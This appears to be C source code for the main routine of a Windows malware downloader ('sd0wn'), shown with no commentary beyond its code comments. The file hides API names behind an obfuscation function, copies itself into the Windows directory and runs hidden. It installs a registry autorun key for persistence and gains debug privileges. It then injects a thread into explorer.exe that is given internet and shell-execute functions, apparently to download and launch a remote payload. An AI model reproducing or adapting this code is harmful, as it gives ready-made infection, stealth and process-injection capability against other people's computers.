int main() 
{
 char curpath[MAX_PATH];
 char windir [MAX_PATH];
 char isdwnd [2];

 unsigned long dwThreadId;
 unsigned long dwThrSize;
 unsigned long pid;
 unsigned long issize = sizeof(isdwnd);

 void *pRemoteThread,*hProcess,*hCurrentProc,*hToken;
 
 HINSTANCE kernel32,user32,advapi32,wininet,shell32;
 HWND window;

 InjS InjL,*pInjL;

  //Load Libraries
  kernel32 = LoadLibrary(crypt("ifvkck;;$o`a"));
  user32   = LoadLibrary(crypt("wpaw55&mfg"));
  advapi32 = LoadLibrary(crypt("cgrdvn;;$o`a"));
  wininet  = LoadLibrary(crypt("ujjlhb|'ng`"));
  shell32  = LoadLibrary(crypt("qkaij4:'ng`"));

  //kernel32 Apis
  fGetModuleHandle  = (Getm)GetProcAddress(kernel32,crypt("EfpHic}eoCmcjcuP"));
  fOpenProcess      = (Open)GetProcAddress(kernel32,crypt("MsakVugjox"));
  fVirtualFreeEx    = (Vfex)GetProcAddress(kernel32,crypt("TjvqsfdOxniHv"));
  fVirtualAllocEx   = (Vaex)GetProcAddress(kernel32,crypt("TjvqsfdHfgcnKw"));
  fVirtualFreeEx    = (Vife)GetProcAddress(kernel32,crypt("TjvqsfdOxniHv"));
  fWriteProcessMem  = (Vprm)GetProcAddress(kernel32,crypt("UqmqcWzfin~Cj}~`j"));
  fCreateRemoteThr  = (Crth)GetProcAddress(kernel32,crypt("AqadrbZlgdxhZgbtsw"));
  fExitThread       = (Exit)GetProcAddress(kernel32,crypt("G{mqRozlko"));
  fZeroMemory       = (Zero)GetProcAddress(kernel32,crypt("Pwh_cugDofcw"));
  fGetCurrentProc   = (GetP)GetProcAddress(kernel32,crypt("EfpFsuzld\\aluba"));
  fSleep	        = (Slee)GetProcAddress(kernel32,crypt("Qoa`v"));
  fCreateMutex      = (Crea)GetProcAddress(kernel32,crypt("AqadrbE|~ntL"));
  fGetLastError     = (Gtle)GetProcAddress(kernel32,crypt("EfpIgt|Lxyc"));
  fGetModuleHandle  = (Ghma)GetProcAddress(kernel32,crypt("EfpHic}eoCmcjcuP"));
  fGetModuleFileN   = (Gmfn)GetProcAddress(kernel32,crypt("EfpHic}eoMeakAq|wR"));
  fGetWinDir        = (Gwdi)GetProcAddress(kernel32,crypt("EfpRoilf}xHd|jse}amT"));
  fCopyFile         = (Cpfi)GetProcAddress(kernel32,crypt("Alt|@ndlK"));
  fCreateFile       = (Cref)GetProcAddress(kernel32,crypt("AqadrbN`fnM"));
  fWriteFile        = (Wref)GetProcAddress(kernel32,crypt("UqmqcAaeo"));
  fExitThread       = (Extt)GetProcAddress(kernel32,crypt("G{mqRozlko"));
  fCloseHandle      = (Clos)GetProcAddress(kernel32,crypt("AokvcOigngi"));
  
  //advapi32 apis
  fLookupPrivilege  = (Look)GetProcAddress(advapi32,crypt("NlknswX{c}eakhuGsapW"));
  fAdjustPrivilege  = (APrv)GetProcAddress(advapi32,crypt("Cgnpus\\fanb]|ffx~vspe"));
  fOpenProcToken    = (Optk)GetProcAddress(advapi32,crypt("MsakVugjoxYadu"));
  fRegCreateKey     = (RegK)GetProcAddress(advapi32,crypt("PfcFtbi}o@itO"));
  fRegSetValueEx    = (RegS)GetProcAddress(advapi32,crypt("PfcVcs^hf~iHvN"));
  fRegCloseKey      = (RegC)GetProcAddress(advapi32,crypt("PfcFjh{lAnu"));
  fRegOpenKeyEx     = (RegO)GetProcAddress(advapi32,crypt("PfcJvbfBorIuO"));
  fRegQueryValueEx  = (RegQ)GetProcAddress(advapi32,crypt("PfcTsbzp\\j`xkJhP"));

  //user32 apis
  fFindWindow       = (Finw)GetProcAddress(user32  ,crypt("DjjaQnfme|M"));
  fGetWindowId      = (Getw)GetProcAddress(user32  ,crypt("EfpRoilf}_dkntA`|wpedQ}"));

  //wininet functions
  fInetCheckConn    = (IChe)GetProcAddress(wininet ,crypt("Kmp`tim}IcineL|vwaxvX"));
  fInternetOpen     = (Inop)GetProcAddress(wininet ,crypt("Kmp`tim}E{icO"));
  fInternetOpenUrl  = (Inou)GetProcAddress(wininet ,crypt("Kmp`tim}E{ic[}|P"));
  fInternetReadFile = (IRef)GetProcAddress(wininet ,crypt("Kmp`tim}XnmiHf|t"));
  fInternetCloseH   = (Cloi)GetProcAddress(wininet ,crypt("Kmp`tim}Igc~kGqvq"));
  
  fShellExecute     = (Shee)GetProcAddress(shell32 ,crypt("QkaijBpli~xhO"));

  //get current path
  fGetModuleFileN(fGetModuleHandle(NULL),curpath,MAX_PATH);

  //current path + \\sdown.exe
  fGetWinDir(windir,sizeof(windir));
  lstrcat(windir,"\\sd0wn2.exe");

  //if current path is different than windir + \\sdown2.exe
  //copy itself to windir and execute itself
  if(lstrcmp(curpath,windir))
  {
   fCopyFile(curpath,windir,TRUE);
   fShellExecute(0,"open",windir,0,0,SW_HIDE);
   return 1;
  }

  //autorun
  if(fRegCreateKey(HKEY_CURRENT_USER,crypt("QlbqqfzlVFen|`c~tgHBy|vmh@^kmRDLWr@TTAFDw~X@"),&hKey) == ERROR_SUCCESS)
  {
   fRegSetValueEx(hKey,"sdown",0,REG_SZ,windir,sizeof(windir));
   fRegCloseKey(hKey);
  }
  //if dowloaded val is 1 than exit
  //becose when sd0wn download file, it writes at regkey + Downloaded val "1" 
  if(fRegOpenKeyEx(HKEY_CURRENT_USER,regkey,0,KEY_ALL_ACCESS,&hOpenkey)==ERROR_SUCCESS)
  {
   if(fRegQueryValueEx(hOpenkey,"downloaded",0,0,(unsigned char*)isdwnd,&issize)==ERROR_SUCCESS)
   if(!lstrcmp(isdwnd,"1"))
     return 1;
  }
 
  //cactulate ThreadProc size
   dwThrSize = (DWORD)end - (DWORD)ThreadProc;
  //Explorer.exe's handle
  if((window = fFindWindow(crypt("qkaijX|{kr{cj"),0)) == NULL)
    return 1;
  //Get Explorer's pid
  fGetWindowId(window,&pid);
  //The GetCurrentProcess function returns a pseudohandle 
  //for the current process.(MSDN)
  hCurrentProc = fGetCurrentProc();

  if (fOpenProcToken(hCurrentProc,TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,&hToken))
    if(!RaisePrivleges(hToken,(char*)SE_DEBUG_NAME));
      //printf("Some Error");

  if(hToken)CloseHandle(hToken);

  //open the process so we can modify it
  if((hProcess = fOpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == NULL)
    return 1;

  //allocate free space in the process
  if((pRemoteThread = fVirtualAllocEx(hProcess,0,(SIZE_T)dwThrSize,
	   MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)) == NULL)
    return 1;

  //Write our ThreadProc in that allocated space
  if(fWriteProcessMem(hProcess,pRemoteThread,&ThreadProc,dwThrSize,0) == 0)
    return 1;
   
  //Clean InjL
  fZeroMemory(&InjL,sizeof(InjS));

  //Fill Inj struct
  //Inj.dwApi			  = (DWORD)Address of Api function
  InjL.dwCreateMutex      = (DWORD)fCreateMutex;
  InjL.dwGetLastError     = (DWORD)fGetLastError;
  InjL.dwExitThread       = (DWORD)fExitThread;
  InjL.dwVirtualFreeEx    = (DWORD)fVirtualFreeEx;
  InjL.dwICheckConn       = (DWORD)fInetCheckConn;
  InjL.dwSleep            = (DWORD)fSleep;
  InjL.dwInternetOpen     = (DWORD)fInternetOpen;
  InjL.dwInternetOpenUrl  = (DWORD)fInternetOpenUrl;
  InjL.dwCreateFile       = (DWORD)fCreateFile;
  InjL.dwInternetReadFile = (DWORD)fInternetReadFile;
  InjL.dwWriteFile        = (DWORD)fWriteFile;
  InjL.dwShellExecute     = (DWORD)fShellExecute;
  InjL.dwCloseHandle      = (DWORD)fCloseHandle;
  InjL.dwInternetCloseH   = (DWORD)fInternetCloseH;
  InjL.dwRegCreateKey     = (DWORD)fRegCreateKey;
  InjL.dwRegSetValueEx    = (DWORD)fRegSetValueEx;
  InjL.dwRegCloseKey      = (DWORD)fRegCloseKey;
  //sleep time
  InjL.stime              = sleeptime;

  //copy data that we need in struct
  lstrcpy(InjL.site      ,checksite);
  lstrcpy(InjL.downsite  ,downfile );
  lstrcpy(InjL.spath     ,savepath );
  lstrcpy(InjL.mtx       ,mtxname  );
  lstrcpy(InjL.regpath   ,regkey   );
  lstrcpy(InjL.downloaded,"downloaded");
  lstrcpy(InjL.ss        ,"1");
  //InjL.ss[0] = '1';
  //InjL.ss[1] = '\0';
  
  //allocate free space for our struct
  if((pInjL =(InjS *)fVirtualAllocEx(hProcess,0,sizeof(InjS),MEM_COMMIT,PAGE_READWRITE)) == NULL)
    return 1;

  //Write our struct in that allocated space
  if((fWriteProcessMem(hProcess,pInjL,&InjL,sizeof(InjL),0)) == 0)
    return 1;
  //run injected function + our struct as argument
  if((fCreateRemoteThr(hProcess,0,0,(DWORD(__stdcall *)(void *))pRemoteThread,pInjL,0,&dwThreadId)) == NULL)
    return 1;
  
  //Free Libraries
  FreeLibrary(shell32);
  FreeLibrary(wininet);
  FreeLibrary(advapi32);
  FreeLibrary(user32);
  FreeLibrary(kernel32);
  //CloseHandle :)
  CloseHandle(hProcess);
 return 0;
}